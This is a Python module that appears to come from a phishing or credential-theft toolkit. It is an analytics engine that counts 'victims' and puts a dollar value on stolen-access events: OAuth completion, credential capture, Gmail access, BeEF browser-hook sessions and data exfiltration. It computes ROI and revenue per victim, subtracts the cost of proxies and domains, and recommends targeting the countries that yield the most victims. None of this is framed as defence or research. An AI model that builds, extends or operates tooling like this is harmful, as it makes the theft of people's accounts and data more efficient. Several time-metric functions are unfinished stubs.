"""
Campaign Analytics Engine
Advanced campaign analytics with conversion tracking and ROI metrics
"""

import os
import json
import time
from datetime import datetime, timezone, timedelta
from typing import Dict, Optional, Any, List, Tuple
import logging
from dataclasses import dataclass, asdict
from collections import defaultdict, Counter
import statistics

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@dataclass
class ConversionEvent:
    """Conversion event data"""
    event_id: str
    campaign_id: str
    victim_id: str
    event_type: str  # oauth_completion, credential_capture, gmail_access, beef_session
    timestamp: datetime
    value: float
    metadata: Dict[str, Any]
    source: str

@dataclass
class CampaignMetrics:
    """Campaign performance metrics"""
    campaign_id: str
    total_sent: int
    total_opened: int
    total_clicked: int
    total_converted: int
    total_bounced: int
    total_unsubscribed: int
    
    # Conversion metrics
    open_rate: float
    click_rate: float
    conversion_rate: float
    bounce_rate: float
    unsubscribe_rate: float
    
    # Value metrics
    total_value: float
    average_value: float
    roi: float
    
    # Time metrics
    average_time_to_open: float
    average_time_to_click: float
    average_time_to_convert: float
    
    # Geographic metrics
    geographic_distribution: Dict[str, int]
    top_countries: List[Tuple[str, int]]
    
    # Device metrics
    device_distribution: Dict[str, int]
    browser_distribution: Dict[str, int]
    
    # Timeline metrics
    hourly_distribution: Dict[int, int]
    daily_distribution: Dict[str, int]

@dataclass
class ROIMetrics:
    """ROI calculation metrics"""
    campaign_id: str
    total_cost: float
    total_revenue: float
    net_profit: float
    roi_percentage: float
    cost_per_acquisition: float
    revenue_per_victim: float
    payback_period: float
    break_even_point: int

class CampaignAnalyticsEngine:
    """Advanced campaign analytics engine"""
    
    def __init__(self, mongodb_connection=None, redis_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client
        self.analytics_cache = {}
        self.conversion_events = []
        
        # Analytics configuration
        self.config = {
            "conversion_values": {
                "oauth_completion": 10.0,
                "credential_capture": 25.0,
                "gmail_access": 50.0,
                "beef_session": 75.0,
                "data_exfiltration": 100.0
            },
            "cost_factors": {
                "proxy_cost_per_hour": 0.05,
                "server_cost_per_hour": 0.10,
                "domain_cost_per_month": 5.0,
                "email_cost_per_send": 0.001
            },
            "time_windows": {
                "open_window": 3600,  # 1 hour
                "click_window": 7200,  # 2 hours
                "conversion_window": 86400  # 24 hours
            }
        }
    
    def track_conversion_event(self, campaign_id: str, victim_id: str, event_type: str, 
                             value: float = None, metadata: Dict[str, Any] = None) -> str:
        """Track a conversion event"""
        try:
            event_id = f"conv_{int(time.time())}_{victim_id}"
            
            if value is None:
                value = self.config["conversion_values"].get(event_type, 0.0)
            
            event = ConversionEvent(
                event_id=event_id,
                campaign_id=campaign_id,
                victim_id=victim_id,
                event_type=event_type,
                timestamp=datetime.now(timezone.utc),
                value=value,
                metadata=metadata or {},
                source="system"
            )
            
            # Store in memory cache
            self.conversion_events.append(event)
            
            # Store in database
            self._store_conversion_event(event)
            
            # Update real-time metrics
            self._update_realtime_metrics(campaign_id, event)
            
            logger.info(f"Conversion event tracked: {event_type} for campaign {campaign_id}")
            return event_id
            
        except Exception as e:
            logger.error(f"Error tracking conversion event: {e}")
            return None
    
    def _store_conversion_event(self, event: ConversionEvent):
        """Store conversion event in database"""
        try:
            if not self.mongodb:
                return
            
            collection = self.mongodb.conversion_events
            event_doc = asdict(event)
            event_doc["timestamp"] = event.timestamp
            
            collection.insert_one(event_doc)
            
        except Exception as e:
            logger.error(f"Error storing conversion event: {e}")
    
    def _update_realtime_metrics(self, campaign_id: str, event: ConversionEvent):
        """Update real-time metrics cache"""
        try:
            cache_key = f"campaign_metrics:{campaign_id}"
            
            if cache_key not in self.analytics_cache:
                self.analytics_cache[cache_key] = {
                    "total_converted": 0,
                    "total_value": 0.0,
                    "conversion_events": []
                }
            
            metrics = self.analytics_cache[cache_key]
            metrics["total_converted"] += 1
            metrics["total_value"] += event.value
            metrics["conversion_events"].append(event)
            
            # Keep only last 100 events in cache
            if len(metrics["conversion_events"]) > 100:
                metrics["conversion_events"] = metrics["conversion_events"][-100:]
            
        except Exception as e:
            logger.error(f"Error updating real-time metrics: {e}")
    
    def get_campaign_metrics(self, campaign_id: str, start_date: datetime = None, 
                           end_date: datetime = None) -> CampaignMetrics:
        """Get comprehensive campaign metrics"""
        try:
            # Set default date range if not provided
            if not start_date:
                start_date = datetime.now(timezone.utc) - timedelta(days=30)
            if not end_date:
                end_date = datetime.now(timezone.utc)
            
            # Get campaign data
            campaign_data = self._get_campaign_data(campaign_id, start_date, end_date)
            
            # Calculate metrics
            metrics = self._calculate_metrics(campaign_id, campaign_data, start_date, end_date)
            
            return metrics
            
        except Exception as e:
            logger.error(f"Error getting campaign metrics: {e}")
            return None
    
    def _get_campaign_data(self, campaign_id: str, start_date: datetime, end_date: datetime) -> Dict[str, Any]:
        """Get campaign data from database"""
        try:
            if not self.mongodb:
                return {}
            
            data = {
                "victims": [],
                "conversion_events": [],
                "email_events": [],
                "click_events": []
            }
            
            # Get victims for this campaign
            victims_collection = self.mongodb.victims
            victims_cursor = victims_collection.find({
                "campaign_id": campaign_id,
                "created_at": {"$gte": start_date, "$lte": end_date}
            })
            data["victims"] = list(victims_cursor)
            
            # Get conversion events
            conversion_collection = self.mongodb.conversion_events
            conversion_cursor = conversion_collection.find({
                "campaign_id": campaign_id,
                "timestamp": {"$gte": start_date, "$lte": end_date}
            })
            data["conversion_events"] = list(conversion_cursor)
            
            # Get email events (opens, clicks)
            activity_collection = self.mongodb.activity_logs
            activity_cursor = activity_collection.find({
                "campaign_id": campaign_id,
                "timestamp": {"$gte": start_date, "$lte": end_date},
                "action": {"$in": ["email_opened", "email_clicked", "email_bounced", "email_unsubscribed"]}
            })
            data["email_events"] = list(activity_cursor)
            
            return data
            
        except Exception as e:
            logger.error(f"Error getting campaign data: {e}")
            return {}
    
    def _calculate_metrics(self, campaign_id: str, campaign_data: Dict[str, Any], 
                          start_date: datetime, end_date: datetime) -> CampaignMetrics:
        """Calculate campaign metrics from data"""
        try:
            victims = campaign_data.get("victims", [])
            conversion_events = campaign_data.get("conversion_events", [])
            email_events = campaign_data.get("email_events", [])
            
            # Basic counts
            total_sent = len(victims)
            total_opened = len([e for e in email_events if e.get("action") == "email_opened"])
            total_clicked = len([e for e in email_events if e.get("action") == "email_clicked"])
            total_converted = len(conversion_events)
            total_bounced = len([e for e in email_events if e.get("action") == "email_bounced"])
            total_unsubscribed = len([e for e in email_events if e.get("action") == "email_unsubscribed"])
            
            # Calculate rates
            open_rate = (total_opened / total_sent * 100) if total_sent > 0 else 0
            click_rate = (total_clicked / total_sent * 100) if total_sent > 0 else 0
            conversion_rate = (total_converted / total_sent * 100) if total_sent > 0 else 0
            bounce_rate = (total_bounced / total_sent * 100) if total_sent > 0 else 0
            unsubscribe_rate = (total_unsubscribed / total_sent * 100) if total_sent > 0 else 0
            
            # Calculate value metrics
            total_value = sum(event.get("value", 0) for event in conversion_events)
            average_value = (total_value / total_converted) if total_converted > 0 else 0
            
            # Calculate time metrics
            time_metrics = self._calculate_time_metrics(email_events, conversion_events)
            
            # Calculate geographic distribution
            geographic_distribution = self._calculate_geographic_distribution(victims)
            top_countries = sorted(geographic_distribution.items(), key=lambda x: x[1], reverse=True)[:10]
            
            # Calculate device distribution
            device_distribution = self._calculate_device_distribution(victims)
            browser_distribution = self._calculate_browser_distribution(victims)
            
            # Calculate timeline distribution
            hourly_distribution = self._calculate_hourly_distribution(victims)
            daily_distribution = self._calculate_daily_distribution(victims)
            
            return CampaignMetrics(
                campaign_id=campaign_id,
                total_sent=total_sent,
                total_opened=total_opened,
                total_clicked=total_clicked,
                total_converted=total_converted,
                total_bounced=total_bounced,
                total_unsubscribed=total_unsubscribed,
                open_rate=open_rate,
                click_rate=click_rate,
                conversion_rate=conversion_rate,
                bounce_rate=bounce_rate,
                unsubscribe_rate=unsubscribe_rate,
                total_value=total_value,
                average_value=average_value,
                roi=0.0,  # Will be calculated separately
                average_time_to_open=time_metrics.get("avg_time_to_open", 0),
                average_time_to_click=time_metrics.get("avg_time_to_click", 0),
                average_time_to_convert=time_metrics.get("avg_time_to_convert", 0),
                geographic_distribution=geographic_distribution,
                top_countries=top_countries,
                device_distribution=device_distribution,
                browser_distribution=browser_distribution,
                hourly_distribution=hourly_distribution,
                daily_distribution=daily_distribution
            )
            
        except Exception as e:
            logger.error(f"Error calculating metrics: {e}")
            return None
    
    def _calculate_time_metrics(self, email_events: List[Dict], conversion_events: List[Dict]) -> Dict[str, float]:
        """Calculate time-based metrics"""
        try:
            time_metrics = {}
            
            # Calculate average time to open
            open_times = []
            for event in email_events:
                if event.get("action") == "email_opened":
                    victim_id = event.get("victim_id")
                    # Find corresponding victim creation time
                    # This would need to be implemented based on your data structure
                    pass
            
            # Calculate average time to click
            click_times = []
            for event in email_events:
                if event.get("action") == "email_clicked":
                    # Similar logic for click times
                    pass
            
            # Calculate average time to convert
            convert_times = []
            for event in conversion_events:
                # Similar logic for conversion times
                pass
            
            return {
                "avg_time_to_open": statistics.mean(open_times) if open_times else 0,
                "avg_time_to_click": statistics.mean(click_times) if click_times else 0,
                "avg_time_to_convert": statistics.mean(convert_times) if convert_times else 0
            }
            
        except Exception as e:
            logger.error(f"Error calculating time metrics: {e}")
            return {}
    
    def _calculate_geographic_distribution(self, victims: List[Dict]) -> Dict[str, int]:
        """Calculate geographic distribution"""
        try:
            distribution = Counter()
            for victim in victims:
                country = victim.get("country", "Unknown")
                distribution[country] += 1
            return dict(distribution)
            
        except Exception as e:
            logger.error(f"Error calculating geographic distribution: {e}")
            return {}
    
    def _calculate_device_distribution(self, victims: List[Dict]) -> Dict[str, int]:
        """Calculate device distribution"""
        try:
            distribution = Counter()
            for victim in victims:
                device_type = victim.get("device_type", "unknown")
                distribution[device_type] += 1
            return dict(distribution)
            
        except Exception as e:
            logger.error(f"Error calculating device distribution: {e}")
            return {}
    
    def _calculate_browser_distribution(self, victims: List[Dict]) -> Dict[str, int]:
        """Calculate browser distribution"""
        try:
            distribution = Counter()
            for victim in victims:
                user_agent = victim.get("user_agent", "")
                browser = self._extract_browser_from_user_agent(user_agent)
                distribution[browser] += 1
            return dict(distribution)
            
        except Exception as e:
            logger.error(f"Error calculating browser distribution: {e}")
            return {}
    
    def _extract_browser_from_user_agent(self, user_agent: str) -> str:
        """Extract browser name from user agent"""
        user_agent_lower = user_agent.lower()
        
        if "chrome" in user_agent_lower:
            return "Chrome"
        elif "firefox" in user_agent_lower:
            return "Firefox"
        elif "safari" in user_agent_lower:
            return "Safari"
        elif "edge" in user_agent_lower:
            return "Edge"
        elif "opera" in user_agent_lower:
            return "Opera"
        else:
            return "Other"
    
    def _calculate_hourly_distribution(self, victims: List[Dict]) -> Dict[int, int]:
        """Calculate hourly distribution"""
        try:
            distribution = Counter()
            for victim in victims:
                created_at = victim.get("created_at")
                if created_at:
                    if isinstance(created_at, str):
                        created_at = datetime.fromisoformat(created_at.replace('Z', '+00:00'))
                    hour = created_at.hour
                    distribution[hour] += 1
            return dict(distribution)
            
        except Exception as e:
            logger.error(f"Error calculating hourly distribution: {e}")
            return {}
    
    def _calculate_daily_distribution(self, victims: List[Dict]) -> Dict[str, int]:
        """Calculate daily distribution"""
        try:
            distribution = Counter()
            for victim in victims:
                created_at = victim.get("created_at")
                if created_at:
                    if isinstance(created_at, str):
                        created_at = datetime.fromisoformat(created_at.replace('Z', '+00:00'))
                    day = created_at.strftime("%Y-%m-%d")
                    distribution[day] += 1
            return dict(distribution)
            
        except Exception as e:
            logger.error(f"Error calculating daily distribution: {e}")
            return {}
    
    def calculate_roi(self, campaign_id: str, start_date: datetime = None, 
                    end_date: datetime = None) -> ROIMetrics:
        """Calculate ROI metrics for campaign"""
        try:
            if not start_date:
                start_date = datetime.now(timezone.utc) - timedelta(days=30)
            if not end_date:
                end_date = datetime.now(timezone.utc)
            
            # Get campaign metrics
            metrics = self.get_campaign_metrics(campaign_id, start_date, end_date)
            if not metrics:
                return None
            
            # Calculate costs
            total_cost = self._calculate_campaign_costs(campaign_id, start_date, end_date)
            
            # Calculate revenue
            total_revenue = metrics.total_value
            
            # Calculate ROI metrics
            net_profit = total_revenue - total_cost
            roi_percentage = (net_profit / total_cost * 100) if total_cost > 0 else 0
            cost_per_acquisition = (total_cost / metrics.total_converted) if metrics.total_converted > 0 else 0
            revenue_per_victim = (total_revenue / metrics.total_sent) if metrics.total_sent > 0 else 0
            
            # Calculate payback period (simplified)
            payback_period = (total_cost / revenue_per_victim) if revenue_per_victim > 0 else 0
            
            # Calculate break-even point
            break_even_point = int(total_cost / revenue_per_victim) if revenue_per_victim > 0 else 0
            
            return ROIMetrics(
                campaign_id=campaign_id,
                total_cost=total_cost,
                total_revenue=total_revenue,
                net_profit=net_profit,
                roi_percentage=roi_percentage,
                cost_per_acquisition=cost_per_acquisition,
                revenue_per_victim=revenue_per_victim,
                payback_period=payback_period,
                break_even_point=break_even_point
            )
            
        except Exception as e:
            logger.error(f"Error calculating ROI: {e}")
            return None
    
    def _calculate_campaign_costs(self, campaign_id: str, start_date: datetime, end_date: datetime) -> float:
        """Calculate total campaign costs"""
        try:
            total_cost = 0.0
            
            # Get campaign duration in hours
            duration_hours = (end_date - start_date).total_seconds() / 3600
            
            # Calculate proxy costs
            proxy_cost = duration_hours * self.config["cost_factors"]["proxy_cost_per_hour"]
            
            # Calculate server costs
            server_cost = duration_hours * self.config["cost_factors"]["server_cost_per_hour"]
            
            # Calculate domain costs (prorated)
            domain_cost = (duration_hours / (30 * 24)) * self.config["cost_factors"]["domain_cost_per_month"]
            
            # Calculate email costs
            # This would need to be calculated based on actual emails sent
            email_cost = 0.0  # Placeholder
            
            total_cost = proxy_cost + server_cost + domain_cost + email_cost
            
            return total_cost
            
        except Exception as e:
            logger.error(f"Error calculating campaign costs: {e}")
            return 0.0
    
    def get_conversion_funnel(self, campaign_id: str, start_date: datetime = None, 
                           end_date: datetime = None) -> Dict[str, Any]:
        """Get conversion funnel analysis"""
        try:
            if not start_date:
                start_date = datetime.now(timezone.utc) - timedelta(days=30)
            if not end_date:
                end_date = datetime.now(timezone.utc)
            
            metrics = self.get_campaign_metrics(campaign_id, start_date, end_date)
            if not metrics:
                return {}
            
            funnel = {
                "stages": [
                    {
                        "name": "Sent",
                        "count": metrics.total_sent,
                        "percentage": 100.0
                    },
                    {
                        "name": "Opened",
                        "count": metrics.total_opened,
                        "percentage": metrics.open_rate
                    },
                    {
                        "name": "Clicked",
                        "count": metrics.total_clicked,
                        "percentage": metrics.click_rate
                    },
                    {
                        "name": "Converted",
                        "count": metrics.total_converted,
                        "percentage": metrics.conversion_rate
                    }
                ],
                "drop_off_rates": {
                    "sent_to_opened": 100.0 - metrics.open_rate,
                    "opened_to_clicked": metrics.open_rate - metrics.click_rate,
                    "clicked_to_converted": metrics.click_rate - metrics.conversion_rate
                },
                "conversion_rates": {
                    "sent_to_opened": metrics.open_rate,
                    "opened_to_clicked": (metrics.click_rate / metrics.open_rate * 100) if metrics.open_rate > 0 else 0,
                    "clicked_to_converted": (metrics.conversion_rate / metrics.click_rate * 100) if metrics.click_rate > 0 else 0
                }
            }
            
            return funnel
            
        except Exception as e:
            logger.error(f"Error getting conversion funnel: {e}")
            return {}
    
    def get_campaign_comparison(self, campaign_ids: List[str], start_date: datetime = None, 
                              end_date: datetime = None) -> Dict[str, Any]:
        """Compare multiple campaigns"""
        try:
            if not start_date:
                start_date = datetime.now(timezone.utc) - timedelta(days=30)
            if not end_date:
                end_date = datetime.now(timezone.utc)
            
            comparison = {
                "campaigns": {},
                "summary": {
                    "best_performing": None,
                    "worst_performing": None,
                    "average_metrics": {}
                }
            }
            
            all_metrics = []
            
            for campaign_id in campaign_ids:
                metrics = self.get_campaign_metrics(campaign_id, start_date, end_date)
                if metrics:
                    comparison["campaigns"][campaign_id] = {
                        "conversion_rate": metrics.conversion_rate,
                        "total_value": metrics.total_value,
                        "total_converted": metrics.total_converted,
                        "roi": self.calculate_roi(campaign_id, start_date, end_date)
                    }
                    all_metrics.append(metrics)
            
            # Calculate summary metrics
            if all_metrics:
                avg_conversion_rate = statistics.mean([m.conversion_rate for m in all_metrics])
                avg_total_value = statistics.mean([m.total_value for m in all_metrics])
                
                comparison["summary"]["average_metrics"] = {
                    "conversion_rate": avg_conversion_rate,
                    "total_value": avg_total_value
                }
                
                # Find best and worst performing campaigns
                best_campaign = max(comparison["campaigns"].items(), 
                                  key=lambda x: x[1]["conversion_rate"])
                worst_campaign = min(comparison["campaigns"].items(), 
                                   key=lambda x: x[1]["conversion_rate"])
                
                comparison["summary"]["best_performing"] = best_campaign[0]
                comparison["summary"]["worst_performing"] = worst_campaign[0]
            
            return comparison
            
        except Exception as e:
            logger.error(f"Error comparing campaigns: {e}")
            return {}
    
    def generate_campaign_report(self, campaign_id: str, start_date: datetime = None, 
                               end_date: datetime = None) -> Dict[str, Any]:
        """Generate comprehensive campaign report"""
        try:
            if not start_date:
                start_date = datetime.now(timezone.utc) - timedelta(days=30)
            if not end_date:
                end_date = datetime.now(timezone.utc)
            
            # Get all metrics
            metrics = self.get_campaign_metrics(campaign_id, start_date, end_date)
            roi_metrics = self.calculate_roi(campaign_id, start_date, end_date)
            funnel = self.get_conversion_funnel(campaign_id, start_date, end_date)
            
            report = {
                "campaign_id": campaign_id,
                "report_period": {
                    "start_date": start_date.isoformat(),
                    "end_date": end_date.isoformat()
                },
                "generated_at": datetime.now(timezone.utc).isoformat(),
                "metrics": asdict(metrics) if metrics else {},
                "roi_metrics": asdict(roi_metrics) if roi_metrics else {},
                "conversion_funnel": funnel,
                "recommendations": self._generate_recommendations(metrics, roi_metrics),
                "summary": self._generate_summary(metrics, roi_metrics)
            }
            
            return report
            
        except Exception as e:
            logger.error(f"Error generating campaign report: {e}")
            return {}
    
    def _generate_recommendations(self, metrics: CampaignMetrics, roi_metrics: ROIMetrics) -> List[Dict[str, Any]]:
        """Generate campaign optimization recommendations"""
        try:
            recommendations = []
            
            if metrics:
                # Low conversion rate recommendation
                if metrics.conversion_rate < 5.0:
                    recommendations.append({
                        "type": "conversion_optimization",
                        "priority": "high",
                        "description": f"Low conversion rate ({metrics.conversion_rate:.1f}%)",
                        "suggestion": "Optimize landing page design and targeting criteria",
                        "potential_impact": "Increase conversion rate by 2-3x"
                    })
                
                # High bounce rate recommendation
                if metrics.bounce_rate > 10.0:
                    recommendations.append({
                        "type": "deliverability",
                        "priority": "medium",
                        "description": f"High bounce rate ({metrics.bounce_rate:.1f}%)",
                        "suggestion": "Improve email list quality and sender reputation",
                        "potential_impact": "Reduce bounce rate and improve deliverability"
                    })
                
                # Geographic optimization
                if metrics.top_countries:
                    top_country = metrics.top_countries[0]
                    recommendations.append({
                        "type": "geographic_optimization",
                        "priority": "low",
                        "description": f"Top performing country: {top_country[0]} ({top_country[1]} victims)",
                        "suggestion": "Focus targeting on high-performing geographic regions",
                        "potential_impact": "Improve campaign efficiency"
                    })
            
            if roi_metrics:
                # Low ROI recommendation
                if roi_metrics.roi_percentage < 100.0:
                    recommendations.append({
                        "type": "roi_optimization",
                        "priority": "high",
                        "description": f"Low ROI ({roi_metrics.roi_percentage:.1f}%)",
                        "suggestion": "Reduce costs or increase conversion value",
                        "potential_impact": "Improve profitability"
                    })
            
            return recommendations
            
        except Exception as e:
            logger.error(f"Error generating recommendations: {e}")
            return []
    
    def _generate_summary(self, metrics: CampaignMetrics, roi_metrics: ROIMetrics) -> Dict[str, Any]:
        """Generate campaign summary"""
        try:
            summary = {
                "performance_score": 0,
                "key_metrics": {},
                "insights": []
            }
            
            if metrics:
                # Calculate performance score (0-100)
                performance_score = 0
                
                # Conversion rate score (40% weight)
                conversion_score = min(metrics.conversion_rate * 2, 40)
                performance_score += conversion_score
                
                # Open rate score (20% weight)
                open_score = min(metrics.open_rate * 0.2, 20)
                performance_score += open_score
                
                # Click rate score (20% weight)
                click_score = min(metrics.click_rate * 0.2, 20)
                performance_score += click_score
                
                # Value score (20% weight)
                value_score = min(metrics.average_value * 0.2, 20)
                performance_score += value_score
                
                summary["performance_score"] = min(performance_score, 100)
                
                summary["key_metrics"] = {
                    "total_victims": metrics.total_sent,
                    "conversion_rate": metrics.conversion_rate,
                    "total_value": metrics.total_value,
                    "average_value": metrics.average_value
                }
                
                # Generate insights
                if metrics.conversion_rate > 10.0:
                    summary["insights"].append("Excellent conversion rate")
                elif metrics.conversion_rate > 5.0:
                    summary["insights"].append("Good conversion rate")
                else:
                    summary["insights"].append("Conversion rate needs improvement")
                
                if metrics.total_value > 1000:
                    summary["insights"].append("High-value campaign")
                elif metrics.total_value > 500:
                    summary["insights"].append("Moderate-value campaign")
                else:
                    summary["insights"].append("Low-value campaign")
            
            if roi_metrics:
                summary["key_metrics"]["roi"] = roi_metrics.roi_percentage
                summary["key_metrics"]["net_profit"] = roi_metrics.net_profit
                
                if roi_metrics.roi_percentage > 200:
                    summary["insights"].append("Excellent ROI")
                elif roi_metrics.roi_percentage > 100:
                    summary["insights"].append("Good ROI")
                else:
                    summary["insights"].append("ROI needs improvement")
            
            return summary
            
        except Exception as e:
            logger.error(f"Error generating summary: {e}")
            return {}

# Global campaign analytics engine instance
campaign_analytics_engine = None

def initialize_campaign_analytics_engine(mongodb_connection=None, redis_client=None) -> CampaignAnalyticsEngine:
    """Initialize campaign analytics engine"""
    global campaign_analytics_engine
    campaign_analytics_engine = CampaignAnalyticsEngine(mongodb_connection, redis_client)
    return campaign_analytics_engine

def get_campaign_analytics_engine() -> CampaignAnalyticsEngine:
    """Get campaign analytics engine instance"""
    global campaign_analytics_engine
    if campaign_analytics_engine is None:
        campaign_analytics_engine = CampaignAnalyticsEngine()
    return campaign_analytics_engine
